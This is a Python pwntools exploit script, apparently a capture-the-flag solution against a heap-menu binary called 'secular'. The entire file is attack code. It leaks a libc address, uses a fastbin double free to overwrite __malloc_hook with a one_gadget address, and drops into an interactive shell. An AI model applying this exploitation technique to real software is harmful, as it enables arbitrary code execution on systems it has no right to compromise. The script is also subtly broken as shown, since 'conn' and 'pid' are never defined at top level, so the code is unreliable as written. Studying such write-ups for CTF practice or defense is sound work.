#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *

context.log_level="debug"
pwn_file="./secular"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
libc_add=0

def exp(r,port):
    conn=remote(r,port)

def debug():
    log.debug("libc address:0x%x"%libc_add)
    log.debug("process pid:%d"%pid)
    pause()

def add(length,name,luck):
    conn.sendlineafter("Your Choice :","1")
    conn.sendlineafter("Input Length of Name:\n",str(length))
    conn.sendafter("Input Your Name:",name)
    conn.sendlineafter("Input Your Luckynumber:",str(luck))

def show(idx):
    conn.sendlineafter("Your Choice :","2")
    conn.sendlineafter("Input Index:\n",str(idx))
    conn.recvuntil("The Content is ")
    return conn.recvline(keepends=False)

def dele(idx):
    conn.sendlineafter("Your Choice :","3")
    conn.sendlineafter("Input Index:",str(idx))

def magic(luck):
    conn.sendlineafter("Your Choice :","4")
    conn.sendlineafter("Input Your Magic Number:\n",str(luck))

add(0xa0,"a"*0xa0,1)#0
add(0xa0,"a"*0xa0,1)#1
dele(0)
add(0x80,"a"*0x8,1)#2
libc_add=u64(show(2)[8:].ljust(8,"\x00"))-0x3c4b78
add(0x60,"a",1)#3
add(0x60,"a",1)#4
add(0x10,"a",1)#5
dele(3)
dele(4)
dele(3)
add(0x60,p64(libc_add+libc.symbols["__malloc_hook"]-19),1)
add(0x60,"a",1)
add(0x60,"a",1)
gadget=[0xf1147,0xf02a4,0x4526a,0x45216]
add(0x60,"a"*3+p64(libc_add+gadget[1]),1)
debug()
dele(2)
dele(2)
conn.interactive()
